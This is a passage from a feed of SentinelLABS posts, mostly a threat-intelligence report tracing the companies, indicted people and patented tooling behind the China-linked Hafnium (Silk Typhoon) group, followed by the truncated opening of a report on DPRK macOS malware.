tiers of relationships between hackers and their customers. This report raises important questions about the extent to which the MSS and its regional offices offer operational support to its contracted hackers.</li>\n<li aria-level=\"1\">Our research delves into several companies tied to the indicted Hafnium-affiliated hackers and documents their relationships. Importantly, the report finds evidence of multiple companies registered by one of the defendants, and dozens more by an associate.</li>\n</ol>\n<p>This new insight into the Hafnium-affiliated firms’ capabilities highlights an important deficiency in the threat actor attribution space: threat actor tracking typically links campaigns and clusters of activity to a named actor. Our research demonstrates the strength in identifying not only the individuals behind attacks, but the companies they work for, the capabilities those companies have, and how those capabilities fortify the initiatives of the state entities who contract with these firms.</p>\n<figure id=\"attachment_128144\" aria-describedby=\"caption-attachment-128144\" style=\"width: 2560px\" class=\"wp-caption aligncenter\"><a href=\"https://www.sentinelone.com/wp-content/uploads/2025/07/hafnium_org_chart-scaled.jpg\"><img loading=\"lazy\" decoding=\"async\" class=\"size-full wp-image-128144\" src=\"https://www.sentinelone.com/wp-content/uploads/2025/07/hafnium_org_chart-scaled.jpg\" alt=\"\" width=\"2560\" height=\"1417\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2025/07/hafnium_org_chart-scaled.jpg 2560w, https://www.sentinelone.com/wp-content/uploads/2025/07/hafnium_org_chart-300x166.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/07/hafnium_org_chart-1024x567.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/07/hafnium_org_chart-768x425.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/07/hafnium_org_chart-1536x850.jpg 1536w, https://www.sentinelone.com/wp-content/uploads/2025/07/hafnium_org_chart-2048x1134.jpg 2048w\" sizes=\"auto, (max-width: 2560px) 100vw, 2560px\" /></a><figcaption id=\"caption-attachment-128144\" class=\"wp-caption-text\">An organization chart for people and businesses known to be associated with Hafnium</figcaption></figure>\n<h2>Hafnium’s Impact</h2>\n<p>It’s rare for a hacking team to behave so recklessly that it changes a country’s foreign policy and unify the E.U., U.K., and U.S. into speaking with one voice, but Hafnium wouldn’t be famous if they hadn’t done that. And, actually, they didn’t do it.</p>\n<p>Hafnium gained fame following the revelation of their stealthy access to U.S. Government emails through an MES <a href=\"https://www.microsoft.com/en-us/security/blog/2021/03/02/hafnium-targeting-exchange-servers/\" target=\"_blank\" rel=\"noopener noreferrer\">vulnerability</a> known as ProxyLogon, which came to light in March 2021. But the group is often <a href=\"https://www.theguardian.com/world/2021/jul/19/what-is-the-hafnium-microsoft-hack-and-why-has-the-uk-linked-it-to-china\" target=\"_blank\" rel=\"noopener noreferrer\">wrongly blamed</a> for what happened next. The name Hafnium became associated with the wider abuse of the ProxyLogon vulnerabilities that followed the original Hafnium activity as lesser tier threat groups flooded the zone with exploitation attempts to opportunistically deliver payloads ranging from espionage to ransomware.</p>\n<p>Microsoft <a href=\"https://www.zdnet.com/article/microsoft-investigates-potential-tie-between-partner-firm-and-potential-exchange-bug-leak/\" target=\"_blank\" rel=\"noopener noreferrer\">alerted</a> its Microsoft Advanced Protection Program partners to some POC code on February 23. This program provides some select cybersecurity companies early access to powerful new exploits, so they can better defend their customers. Five days later on <a href=\"https://www.theguardian.com/world/2021/jul/19/what-is-the-hafnium-microsoft-hack-and-why-has-the-uk-linked-it-to-china\" target=\"_blank\" rel=\"noopener noreferrer\">February 28th</a>, new Chinese state-affiliated and criminal hacking groups began exploiting the vulnerability at an immense scale. It remains unclear how exactly the exploit proliferated ahead of the patch. The longer tail of the problem arises from the prevalence of webshells littered by each attacker’s use of ProxyLogon. These groups left shells on vulnerable servers allowing access to these servers even after the vulnerability itself was patched. The situation was so dire that the DOJ received its first court <a href=\"https://www.justice.gov/archives/opa/press-release/file/1386631/dl?inline=\" target=\"_blank\" rel=\"noopener noreferrer\">authorization</a> for the FBI to remove these shells en masse from compromised servers.</p>\n<p>The rapid dissemination and exploitation of the vulnerability led the U.S., U.K., and E.U. to issue their first ever joint <a href=\"https://www.ncsc.gov.uk/news/uk-allies-hold-chinese-state-responsible-for-pervasive-pattern-of-hacking\" target=\"_blank\" rel=\"noopener noreferrer\">statement</a> condemning PRC actions in cyberspace in July 2021. The statement roiled CCP policymakers who had previously fended off such joint decrees by convincing one E.U. state to reject such declarations. Because the E.U. requires unanimous consent for foreign policy statements, the fallout from the wanton abuse of the vulnerability upended China’s foreign policy success.</p>\n<p>The joint statement so perturbed CCP policymakers that the country launched an offensive public opinion <a href=\"https://www.sentinelone.com/labs/chinas-cyber-revenge-why-the-prc-fails-to-back-its-claims-of-western-espionage/\" target=\"_blank\" rel=\"noopener noreferrer\">campaign</a> against U.S. hacking operations that continues today. Before the July 2021 joint statement, the PRC did not coordinate cyber threat intelligence publications with state propaganda outlets. Following the statement, a pattern emerged of coordinated private-sector CTI reports, English-language propaganda pieces, and statements by the PRC Ministry of Foreign Affairs. SentinelOne published a report detailing this change in February 2024 and the findings of that report are <a href=\"https://bsky.app/profile/dakotaindc.bsky.social/post/3ljqcdea6lc2e\" target=\"_blank\" rel=\"noopener noreferrer\">corroborated</a> by a textbook on cybersecurity published by a committee of experts in China. China now regularly releases propaganda pieces alongside cyber threat intelligence reports–the change was completely prompted by the success the U.S. had in unifying the European Union behind a joint statement, which was itself enabled by China’s behavior.</p>\n<h2>Hafnium’s False Start or The Less Capable Cluster?</h2>\n<p>Following an intrusion into U.S. Treasury systems that came to light in late 2024, the Department <a href=\"https://home.treasury.gov/news/press-releases/jy2792\" target=\"_blank\" rel=\"noopener noreferrer\">sanctioned</a> one of its alleged hackers, Yin Kecheng (尹可成). The Treasury sanctions announced in January 2025 were quickly followed by a March DOJ <a href=\"https://www.justice.gov/usao-dc/pr/chinese-nationals-ties-prc-government-and-apt27-charged-computer-hacking-campaign-profit\" target=\"_blank\" rel=\"noopener noreferrer\">indictment</a> of Yin and a business associate, Zhou Shuai (周帅). Two separate indictments were released for Yin in March. The first <a href=\"https://www.justice.gov/usao-dc/media/1391916/dl?inline\" target=\"_blank\" rel=\"noopener noreferrer\">document</a> is dated 2017 and only Yin is named as the defendant. The second <a href=\"https://www.justice.gov/opa/media/1391906/dl\" target=\"_blank\" rel=\"noopener noreferrer\">indictment</a> is dated 2023 and lists both Yin and Zhou.</p>\n<p>Zhou Shuai, aka Coldface, is a first-generation patriotic hacker from China with a storied <a href=\"https://nattothoughts.substack.com/p/zhou-shuai-a-hackers-road-to-apt27\" target=\"_blank\" rel=\"noopener noreferrer\">history</a> of corporate registrations and work for the state. The March 2025 indictment of Zhou and Yin indicate that Zhou brokered the sale of Yin’s work through iSoon, a company whose internal chats and corporate records were <a href=\"https://margin.re/2024/02/same-same-but-different/\" target=\"_blank\" rel=\"noopener noreferrer\">leaked</a> online in early 2024. Leaked chats showed iSoon executives considering a merger and acquisition of Zhou’s Shanghai-based company. iSoon executives also <a href=\"https://nattothoughts.substack.com/p/zhou-shuai-a-hackers-road-to-apt27\" target=\"_blank\" rel=\"noopener noreferrer\">chastised</a> Zhou for being a mere broker.</p>\n<p>The DOJ press <a href=\"https://www.justice.gov/usao-dc/pr/chinese-nationals-ties-prc-government-and-apt27-charged-computer-hacking-campaign-profit\" target=\"_blank\" rel=\"noopener noreferrer\">release</a> for the indictments indicate that Yin’s and Zhou’s activities were tracked under various naming conventions and clusters, including Silk Typhoon. Microsoft updated the group’s alias from Hafnium to Silk Typhoon in 2022.</p>\n<figure id=\"attachment_128097\" aria-describedby=\"caption-attachment-128097\" style=\"width: 2282px\" class=\"wp-caption aligncenter\"><a href=\"https://www.sentinelone.com/wp-content/uploads/2025/07/hafnium_DOJ_pressrelease.jpg\"><img loading=\"lazy\" decoding=\"async\" class=\"size-full wp-image-128097\" src=\"https://www.sentinelone.com/wp-content/uploads/2025/07/hafnium_DOJ_pressrelease.jpg\" alt=\"\" width=\"2282\" height=\"324\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2025/07/hafnium_DOJ_pressrelease.jpg 2282w, https://www.sentinelone.com/wp-content/uploads/2025/07/hafnium_DOJ_pressrelease-300x43.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/07/hafnium_DOJ_pressrelease-1024x145.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/07/hafnium_DOJ_pressrelease-768x109.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/07/hafnium_DOJ_pressrelease-1536x218.jpg 1536w, https://www.sentinelone.com/wp-content/uploads/2025/07/hafnium_DOJ_pressrelease-2048x291.jpg 2048w\" sizes=\"auto, (max-width: 2282px) 100vw, 2282px\" /></a><figcaption id=\"caption-attachment-128097\" class=\"wp-caption-text\">DOJ press release summary listing the Hafnium group’s aliases</figcaption></figure>\n<p>As of March 2025, Hafnium apparently <a href=\"https://nattothoughts.substack.com/p/zhou-shuai-a-hackers-road-to-apt27\" target=\"_blank\" rel=\"noopener noreferrer\">consisted</a> of a Shanghai-based company, Shanghai Heiying Information Technology Company (上海黑英信息技术有限公司), run by Zhou Shuai, which collaborated with Yin Kecheng in some fashion.</p>\n<h2>Hafnium and Other Elements</h2>\n<p>Following the July 2025 released indictment of Xu Zewei and Zhang Yu, the number of people alleged to work for Hafnium grew to four and the number of companies involved grew to three. The DOJ maintains that Xu Zewei and Zhang Yu worked at the “direction” of Shanghai State Security Bureau (SSSB). Xu Zewei completed his tasking while working at Shanghai Powerock Network Company (上海势岩网络科技发展有限公司); Zhang Yu worked at Shanghai Firetech Information Science and Technology Company (上海势炎信息科技有限公司).</p>\n<p>This “directed” nature of the relationship between the SSSB and these two companies contours the tiered system of offensive hacking outfits in China.</p>\n<p><a href=\"https://nattothoughts.substack.com/p/hafnium-linked-hacker-xu-zewei-riding\" target=\"_blank\" rel=\"noopener noreferrer\">Other capable analysts</a> adeptly delve into Shanghai Powerock, so this report focuses on Zhang Yu’s company, Shanghai Firetech. Far from being an offensive shop procuring initial access and intelligence in the hopes of finding a willing buyer, as in the case of i-Soon, Shanghai Firetech worked on specific tasking handed down from MSS officers. The indictment maintains that Zhang Yu “supervised hacking activity, including that of other Firetech personnel in support of such [SSSB] taskings, and coordinated hacking activities with fellow hacker XU.” This indicates that Shanghai Firetech and co-conspirators earned an on-going, trusting relationship with the MSS’s premier regional office, the SSSB.</p>\n<p><a href=\"https://nattothoughts.substack.com/p/front-company-or-real-business-in\" target=\"_blank\" rel=\"noopener noreferrer\">China experts</a> and law enforcement distinguish between China’s operational structures. At the lowest tier of the contracting ecosystem are bottom feeders, like i-Soon. That company’s <a href=\"https://www.sentinelone.com/labs/unmasking-i-soon-the-leak-that-revealed-chinas-cyber-operations/\" target=\"_blank\" rel=\"noopener noreferrer\">leaked files</a> and <a href=\"https://www.justice.gov/usao-sdny/pr/10-chinese-nationals-charged-large-scale-hacking-us-and-international-victims-behalf\" target=\"_blank\" rel=\"noopener noreferrer\">U.S. indictment of their employees</a> show a firm stuck in low-paying contracts with poor morale, and often subcontracting to bigger, better firms. A step up from i-Soon might be its prime contractor and competitor, Chengdu404, <a href=\"https://www.justice.gov/archives/opa/pr/seven-international-cyber-defendants-including-apt41-actors-charged-connection-computer\" target=\"_blank\" rel=\"noopener noreferrer\">whose founders were also indicted</a>. Chengdu 404 has stable business, works from multiple offices, and at one point was China’s most prolific APT. The tier of contractors the Chinese government holds closest are actors like Xu Zewei and Zhang Yu. But the MSS has not completely abandoned state-run operations. Past DOJ indictments show that other MSS offices do indeed use front companies. The Hubei State Security Department <a href=\"https://www.justice.gov/usao-edny/media/1345131/dl\" target=\"_blank\" rel=\"noopener noreferrer\">established</a> Wuhan Xiao Rui Zhi (Wuhan XRZ) in 2010 as a front company for state operations.</p>\n<h3>You’re My Favorite Deputy</h3>\n<p>The peculiarities of Hafnium’s MES exploitation campaign raise questions about the relationship between the SSSB and its contractors. Hafnium began exploiting MES vulnerabilities <a href=\"https://www.justice.gov/archives/opa/pr/justice-department-announces-court-authorized-effort-disrupt-exploitation-microsoft-exchange\" target=\"_blank\" rel=\"noopener noreferrer\">beginning in January 2021</a>. The exact date Hafnium’s campaign began is unclear, but the month is itself enough to raise eyebrows. On January 5, 2021, <a href=\"https://x.com/orange_8361/status/1346401788811825153\" target=\"_blank\" rel=\"noopener noreferrer\">OrangeTsai tweeted</a> he had found an incredibly powerful pre-auth RCE vulnerability, <a href=\"https://blog.orange.tw/posts/2021-08-proxylogon-a-new-attack-surface-on-ms-exchange-part-1/\" target=\"_blank\" rel=\"noopener noreferrer\">later confirmed</a> to be the same MES vulnerabilities exploited by Hafnium. How did Hafnium come to exploit those vulnerabilities in the same month that OrangeTsai found them?</p>\n<p><a href=\"https://securityconversations.fireside.fm/hafnium-hacker-arrested-china-microsoft-zerodays\" target=\"_blank\" rel=\"noopener noreferrer\">Theories swirled</a> that Hafnium had compromised devices of employees working on inbound vulnerability reports at Microsoft. Other attention turned to the researcher’s personal security. As a resident of Taiwan, international conference attendee, and among the most talented vulnerability researchers with a public persona, it would not be inconceivable that Hafnium had itself hacked into OrangeTsai’s devices and stolen the vulnerabilities during his research phase.</p>\n<p>But the Zhang and Xu’s close relationship with the SSSB raises the possibility that the Bureau collected OrangeTsai’s research themselves, either through an insider at Microsoft, a close-access operation against OrangeTsai, or some other collection method, and then passed the vulnerabilities to Xu and Zhang. A DOJ indictment shows the Guangdong State Security Department <a href=\"https://cyberlaw.stanford.edu/content/files/opa/press-release/file/1295981/download.pdf\" target=\"_blank\" rel=\"noopener noreferrer\">passing malware</a> to its contracted hackers: had the SSSB done something similar?</p>\n<h3>Before Shanghai</h3>\n<p>How Zhang Yu and Shanghai Firetech came to work for the SSSB remains unclear. Before moving into offensive hacking, Zhang Yu co-founded a <a href=\"https://archive.ph/65Mk1\" target=\"_blank\" rel=\"noopener noreferrer\">company</a> Shanghai Weiling Information Science and Technology Co. (上海微令信息科技有限公司) whose smartphone application Campus Command (校园司令) aimed to connect college students with local events and information at Universities across China. But, as with all investigations, that is perhaps not the whole story. Zhang Yu co-founded Campus Command with the CEO and legal representative of Shanghai Firetech, Yin Wenji (尹文基). The two associated were joined by a third person, Peng Yinan (彭一楠). Campus Command was, until 2016, a <a href=\"https://archive.ph/65Mk1\" target=\"_blank\" rel=\"noopener noreferrer\">subsidiary</a> of Xin Kai Pu (新开普), a company whose shares are publicly traded on the stock exchange in Shenzhen.

While no public tenders or contracts were found, Shanghai Firetech likely offers offensive services to additional customers beyond Shanghai. The company maintains a subsidiary in Chongqing, Chongqing Firetech (重庆势炎信息科技有限公司). Chongqing Firetech is likely larger than its Shanghai-based mothership.

At least two of those persons, Xu Zewei and Zhang Yu, and their respective companies, Shanghai Powerock Network Co Ltd. and Shanghai Firetech Information Science and Technology Co Ltd, worked under the direction of the Shanghai SSB. Yin Kecheng likely worked alongside Xu and Zhang, though in what capacity–as an employee, subcontractor, or jointly-tasked by the SSSB–is unclear.

The findings underline the difficulty in successfully attributing intrusions to the organizations responsible for them. The capabilities may have been sold to other regional MSS offices, and thus not attributed to Hafnium, despite being owned by the same corporate structure. It is possible that none of the tooling uncovered by this report was ever deployed in offensive operations. Tooling for the remote control of home appliances, home computer networks, decryption of files, and remote mobile forensics do have commercial defensive applications. That said, we reasonably expect those tools to be advertised if sold for defensive purposes, and no such collateral exists.</p>\n<p>Threat actor designations and naming conventions track clusters of behavior, not the organizations carrying out operations. Successful attribution resolves a campaign back to their actual operators, like Hafnium or Fancy Bear. This report finds there are very likely other campaigns and activities tracked under different names which can be attributed to Shanghai Firetech. The absence of their inclusion in the DOJ indictment of Zhang Yu and Xu Zewei may reflect a balance of equities on the part of the FBI, releasing in the indictment only what is popularly recognized as Hafnium and meets relevant legal thresholds while privately retaining intelligence of the company’s other campaigns and tooling.</p>\n","content:encodedSnippet":"Executive Summary\nSentinelLABS identified 10+ patents for highly intrusive forensics and data collection technologies that were registered by companies named in U.S. indictments as working on behalf of the Hafnium threat actor group.\nThese technologies offer strong, often previously unreported offensive capabilities, from acquisition of encrypted endpoint data, mobile forensics, to collecting traffic from network devices.\nOur research explores the relationships between indicted hackers, ownership of the firms they are associated with, and the relationships those firms have with several government entities who conduct offensive cyber operations on behalf of China.\nOverview\nIn July 2025, the Department of Justice (DOJ) released an indictment of two hackers, Xu Zewei and Zhang Yu, working on behalf of China’s Ministry of State Security (MSS) that sheds new light on the People’s Republic of China’s (PRC) contracting ecosystem. The indictment outlined that Xu and Zhang worked for two firms previously unattributed in the public domain to the Hafnium (aka Silk Typhoon) threat actor group. Hafnium has a long history of attacks against defense contractors, policy think tanks, higher education, and infectious disease research institutions, with an exceptionally prolific 2021 campaign that exploited several 0-day vulnerabilities in Microsoft Exchange Server (MES). Hafnium’s history of exploits and 0day use, combined with its targets and observed campaigns make it one of China’s best APTs.\nThis research resulted in three key findings.\nWe identified previously unobserved or unreported offensive tooling owned by Hafnium-associated companies named in U.S. indictments. The tooling raises questions about these firms’ on-going work in support of the MSS and how attribution is difficult. The company holds at least one patent on software designed to remotely recover files from Apple computers, which has not been documented as a capability used by Hafnium or any related threat actor groups.\nThe DOJ indictment provides new insights into the tiers of relationships between hackers and their customers. This report raises important questions about the extent to which the MSS and its regional offices offer operational support to its contracted hackers.\nOur research delves into several companies tied to the indicted Hafnium-affiliated hackers and documents their relationships. Importantly, the report finds evidence of multiple companies registered by one of the defendants, and dozens more by an associate.\nThis new insight into the Hafnium-affiliated firms’ capabilities highlights an important deficiency in the threat actor attribution space: threat actor tracking typically links campaigns and clusters of activity to a named actor. Our research demonstrates the strength in identifying not only the individuals behind attacks, but the companies they work for, the capabilities those companies have, and how those capabilities fortify the initiatives of the state entities who contract with these firms.\nAn organization chart for people and businesses known to be associated with Hafnium\nHafnium’s Impact\nIt’s rare for a hacking team to behave so recklessly that it changes a country’s foreign policy and unify the E.U., U.K., and U.S. into speaking with one voice, but Hafnium wouldn’t be famous if they hadn’t done that. And, actually, they didn’t do it.\nHafnium gained fame following the revelation of their stealthy access to U.S. Government emails through an MES vulnerability known as ProxyLogon, which came to light in March 2021. But the group is often wrongly blamed for what happened next. The name Hafnium became associated with the wider abuse of the ProxyLogon vulnerabilities that followed the original Hafnium activity as lesser tier threat groups flooded the zone with exploitation attempts to opportunistically deliver payloads ranging from espionage to ransomware.\nMicrosoft alerted its Microsoft Advanced Protection Program partners to some POC code on February 23. This program provides some select cybersecurity companies early access to powerful new exploits, so they can better defend their customers. Five days later on February 28th, new Chinese state-affiliated and criminal hacking groups began exploiting the vulnerability at an immense scale. It remains unclear how exactly the exploit proliferated ahead of the patch. The longer tail of the problem arises from the prevalence of webshells littered by each attacker’s use of ProxyLogon. These groups left shells on vulnerable servers allowing access to these servers even after the vulnerability itself was patched. The situation was so dire that the DOJ received its first court authorization for the FBI to remove these shells en masse from compromised servers.\nThe rapid dissemination and exploitation of the vulnerability led the U.S., U.K., and E.U. to issue their first ever joint statement condemning PRC actions in cyberspace in July 2021. The statement roiled CCP policymakers who had previously fended off such joint decrees by convincing one E.U. state to reject such declarations. Because the E.U. requires unanimous consent for foreign policy statements, the fallout from the wanton abuse of the vulnerability upended China’s foreign policy success.\nThe joint statement so perturbed CCP policymakers that the country launched an offensive public opinion campaign against U.S. hacking operations that continues today. Before the July 2021 joint statement, the PRC did not coordinate cyber threat intelligence publications with state propaganda outlets. Following the statement, a pattern emerged of coordinated private-sector CTI reports, English-language propaganda pieces, and statements by the PRC Ministry of Foreign Affairs. SentinelOne published a report detailing this change in February 2024 and the findings of that report are corroborated by a textbook on cybersecurity published by a committee of experts in China. China now regularly releases propaganda pieces alongside cyber threat intelligence reports–the change was completely prompted by the success the U.S. had in unifying the European Union behind a joint statement, which was itself enabled by China’s behavior.\nHafnium’s False Start or The Less Capable Cluster?\nFollowing an intrusion into U.S. Treasury systems that came to light in late 2024, the Department sanctioned one of its alleged hackers, Yin Kecheng (尹可成). The Treasury sanctions announced in January 2025 were quickly followed by a March DOJ indictment of Yin and a business associate, Zhou Shuai (周帅). Two separate indictments were released for Yin in March. The first document is dated 2017 and only Yin is named as the defendant. The second indictment is dated 2023 and lists both Yin and Zhou.\nZhou Shuai, aka Coldface, is a first-generation patriotic hacker from China with a storied history of corporate registrations and work for the state. The March 2025 indictment of Zhou and Yin indicate that Zhou brokered the sale of Yin’s work through iSoon, a company whose internal chats and corporate records were leaked online in early 2024. Leaked chats showed iSoon executives considering a merger and acquisition of Zhou’s Shanghai-based company. iSoon executives also chastised Zhou for being a mere broker.\nThe DOJ press release for the indictments indicate that Yin’s and Zhou’s activities were tracked under various naming conventions and clusters, including Silk Typhoon. Microsoft updated the group’s alias from Hafnium to Silk Typhoon in 2022.\nDOJ press release summary listing the Hafnium group’s aliases\nAs of March 2025, Hafnium apparently consisted of a Shanghai-based company, Shanghai Heiying Information Technology Company (上海黑英信息技术有限公司), run by Zhou Shuai, which collaborated with Yin Kecheng in some fashion.\nHafnium and Other Elements\nFollowing the July 2025 released indictment of Xu Zewei and Zhang Yu, the number of people alleged to work for Hafnium grew to four and the number of companies involved grew to three. The DOJ maintains that Xu Zewei and Zhang Yu worked at the “direction” of Shanghai State Security Bureau (SSSB). Xu Zewei completed his tasking while working at Shanghai Powerock Network Company (上海势岩网络科技发展有限公司); Zhang Yu worked at Shanghai Firetech Information Science and Technology Company (上海势炎信息科技有限公司).\nThis “directed” nature of the relationship between the SSSB and these two companies contours the tiered system of offensive hacking outfits in China.\nOther capable analysts adeptly delve into Shanghai Powerock, so this report focuses on Zhang Yu’s company, Shanghai Firetech. Far from being an offensive shop procuring initial access and intelligence in the hopes of finding a willing buyer, as in the case of i-Soon, Shanghai Firetech worked on specific tasking handed down from MSS officers. The indictment maintains that Zhang Yu “supervised hacking activity, including that of other Firetech personnel in support of such [SSSB] taskings, and coordinated hacking activities with fellow hacker XU.” This indicates that Shanghai Firetech and co-conspirators earned an on-going, trusting relationship with the MSS’s premier regional office, the SSSB.\nChina experts and law enforcement distinguish between China’s operational structures. At the lowest tier of the contracting ecosystem are bottom feeders, like i-Soon. That company’s leaked files and U.S. indictment of their employees show a firm stuck in low-paying contracts with poor morale, and often subcontracting to bigger, better firms. A step up from i-Soon might be its prime contractor and competitor, Chengdu404, whose founders were also indicted. Chengdu 404 has stable business, works from multiple offices, and at one point was China’s most prolific APT. The tier of contractors the Chinese government holds closest are actors like Xu Zewei and Zhang Yu. But the MSS has not completely abandoned state-run operations. Past DOJ indictments show that other MSS offices do indeed use front companies. The Hubei State Security Department established Wuhan Xiao Rui Zhi (Wuhan XRZ) in 2010 as a front company for state operations.\nYou’re My Favorite Deputy\nThe peculiarities of Hafnium’s MES exploitation campaign raise questions about the relationship between the SSSB and its contractors. Hafnium began exploiting MES vulnerabilities beginning in January 2021. The exact date Hafnium’s campaign began is unclear, but the month is itself enough to raise eyebrows. On January 5, 2021, OrangeTsai tweeted he had found an incredibly powerful pre-auth RCE vulnerability, later confirmed to be the same MES vulnerabilities exploited by Hafnium. How did Hafnium come to exploit those vulnerabilities in the same month that OrangeTsai found them?\nTheories swirled that Hafnium had compromised devices of employees working on inbound vulnerability reports at Microsoft. Other attention turned to the researcher’s personal security. As a resident of Taiwan, international conference attendee, and among the most talented vulnerability researchers with a public persona, it would not be inconceivable that Hafnium had itself hacked into OrangeTsai’s devices and stolen the vulnerabilities during his research phase.\nBut the Zhang and Xu’s close relationship with the SSSB raises the possibility that the Bureau collected OrangeTsai’s research themselves, either through an insider at Microsoft, a close-access operation against OrangeTsai, or some other collection method, and then passed the vulnerabilities to Xu and Zhang. A DOJ indictment shows the Guangdong State Security Department passing malware to its contracted hackers: had the SSSB done something similar?\nBefore Shanghai\nHow Zhang Yu and Shanghai Firetech came to work for the SSSB remains unclear. Before moving into offensive hacking, Zhang Yu co-founded a company Shanghai Weiling Information Science and Technology Co. (上海微令信息科技有限公司) whose smartphone application Campus Command (校园司令) aimed to connect college students with local events and information at Universities across China. But, as with all investigations, that is perhaps not the whole story. Zhang Yu co-founded Campus Command with the CEO and legal representative of Shanghai Firetech, Yin Wenji (尹文基). The two associated were joined by a third person, Peng Yinan (彭一楠). Campus Command was, until 2016, a subsidiary of Xin Kai Pu (新开普), a company whose shares are publicly traded on the stock exchange in Shenzhen. When Xin Kai Pu divested its shares, Peng, Yin, and Zhang moved their holdings into a privately held company offering business consulting services Shanghai Siling Commerce Consulting Center (上海司领商务咨询中心). Peng now holds shares in at least 25 companies registered in China.\nA 2015 talk by Yin Wenji, the eventual founder of Shanghai Firetech and co-founder of Campus Command, raises questions about his offensive capabilities while working at the university-focused company with the indicted Zhang Yu.\nYin spoke at the Central University of Finance and Economics program for cybersecurity. His 2015 talk advertised his ability to recover files from Apple Filevault five years before his new company would file for patent protection on a tool capable of collecting files from Apple computers.\nDescription of Yin Wenji’s 2015 talk at the Central University of Finance and Economics\nThe talk description translates to:\n“In this speech, the author will sort out some methods and directions of forensics on Apple electronic products, and propose new ideas for some technical difficulties such as Mac computer firmware passwords and FileVault full disk encryption technology, and will demonstrate the latest research results.”\nSilk Bandolier\nThere is good reason to believe only some of Shanghai Firetech’s activities have been uncovered or made public by defenders. Hafnium rose to prominence in 2021 following the exploitation of four 0-day vulnerabilities in Microsoft Exchange Servers. Subsequent publications demonstrate the group is responsible for cracking a host of firewalls and network appliances. Intellectual property rights filings by Shanghai Firetech indicate an arsenal of tools not publicly attributed to Hafnium thus far. Shanghai Firetech filed for patents on a number of forensics technologies with clear applications as offensive capabilities including\n“remote automated evidence collection software”\n“Apple computer comprehensive evidence collection software”\n“router intelligent evidence collection software”\n“computer scene rapid evidence collection software”\n“defensive equipment reverse production software”\nWhile Hafnium’s observed capabilities check some of these generic boxes, no one has previously reported the group’s capabilities against Apple devices.\nShanghai Firetech technology patents\nMore recent patent filings from Shanghai Firetech, combined with the company’s history of working with the SSSB, suggests the company holds capabilities that may be useful in HUMINT operations. Capabilities like “intelligent home appliances analysis platform (2),” “long-range household computer network intelligentized control software (6),” and “intelligent home appliances evidence collection software (23)” could support close access operations against individuals. Other recent patents demonstrate that the firm still supports offensive cyber operations, such as “specially designed computer hard drive decryption software (13),”remote cellphone evidence collection software (21),” or “network information security actual confrontation practice software (24).”\n\n\n\n\nMore recent Shanghai Firetech technology patent filings\nShanghai Firetech relationships with MSS offices beyond just the Shanghai Bureau may explain why some patented capabilities have not been observed to be associated with Hafnium tradecraft. While no public tenders or contracts were found, Shanghai Firetech likely offers offensive services to additional customers beyond Shanghai. The company maintains a subsidiary in Chongqing, Chongqing Firetech (重庆势炎信息科技有限公司). Chongqing Firetech is likely larger than its Shanghai-based mothership.

Shanghai Firetech, by contrast, only paid insurance benefits on 32 full-time employees. It is unclear whether the absence of Chongqing Firetech from the indictment indicates that the company was not involved in activity attributed to the Hafnium cluster.\nConclusion\nThe combination of leaked chat logs from iSoon, the March 2025 indictments of Yin Kecheng and Zhou Shuai, and the July 2025 indictment Xu Zewei and Zhang Yu indicate that the Hafnium cluster consisted of at least three different companies. At least two of those persons, Xu Zewei and Zhang Yu, and their respective companies, Shanghai Powerock Network Co Ltd. and Shanghai Firetech Information Science and Technology Co Ltd, worked under the direction of the Shanghai SSB. Yin Kecheng likely worked alongside Xu and Zhang, though in what capacity–as an employee, subcontractor, or jointly-tasked by the SSSB–is unclear. Although Zhou Shuai is observed trying to sell Yin’s work through i-Soon, it is unknown what of Yin’s work, access, or tooling Zhou was trying to push.\nThe variety of tools under the control of Shanghai Firetech exceed those attributed to Hafnium and Silk Typhoon publicly. The findings underline the difficulty in successfully attributing intrusions to the organizations responsible for them. The capabilities may have been sold to other regional MSS offices, and thus not attributed to Hafnium, despite being owned by the same corporate structure. It is possible that none of the tooling uncovered by this report was ever deployed in offensive operations. Tooling for the remote control of home appliances, home computer networks, decryption of files, and remote mobile forensics do have commercial defensive applications. That said, we reasonably expect those tools to be advertised if sold for defensive purposes, and no such collateral exists.\nThreat actor designations and naming conventions track clusters of behavior, not the organizations carrying out operations. Successful attribution resolves a campaign back to their actual operators, like Hafnium or Fancy Bear. This report finds there are very likely other campaigns and activities tracked under different names which can be attributed to Shanghai Firetech. The absence of their inclusion in the DOJ indictment of Zhang Yu and Xu Zewei may reflect a balance of equities on the part of the FBI, releasing in the indictment only what is popularly recognized as Hafnium and meets relevant legal thresholds while privately retaining intelligence of the company’s other campaigns and tooling.","enclosure":{"url":"https://www.sentinelone.com/wp-content/uploads/2025/07/hafnium_spunsilk.jpg","length":"72595","type":"image/jpeg"},"dc:creator":"Dakota Cary","content":"China-linked hackers used patented spyware tech from front companies tied to Hafnium, exposing gaps in cyber threat attribution.","contentSnippet":"China-linked hackers used patented spyware tech from front companies tied to Hafnium, exposing gaps in cyber threat attribution.","guid":"https://www.sentinelone.com/?post_type=labs&p=127547","categories":["apple","China","HAFNIUM","Silk Typhoon"],"isoDate":"2025-07-30T10:00:31.000Z","tag":"intel"},{"creator":"Phil Stokes &amp; Raffaele Sabato","title":"macOS NimDoor | DPRK Threat Actors Target Web3 and Crypto Platforms with Nim-Based Malware","link":"https://www.sentinelone.com/labs/macos-nimdoor-dprk-threat-actors-target-web3-and-crypto-platforms-with-nim-based-malware/","pubDate":"Wed, 02 Jul 2025 09:55:37 +0000","content:encoded":"<h2>Executive Summary</h2>\n<ul>\n<li aria-level=\"1\">DPRK threat actors are utilizing Nim-compiled binaries and multiple attack chains in a campaign targeting Web3 and Crypto-related businesses.</li>\n<li aria-level=\"1\">Unusually for macOS malware, the threat actors employ a process injection technique and remote communications via <code>wss</code>, the TLS-encrypted version of the WebSocket protocol.</li>\n<li aria-level=\"1\"> A novel persistence mechanism takes advantage of SIGINT/SIGTERM signal handlers to install persistence when the malware is terminated or the system rebooted.</li>\n<li aria-level=\"1\">The threat actors deploy AppleScripts widely, both to gain initial access and also later in the attack chain to function as lightweight beacons and backdoors.</li>\n<li aria-level=\"1\">Bash scripts are used to exfiltrate Keychain credentials, browser data and Telegram user 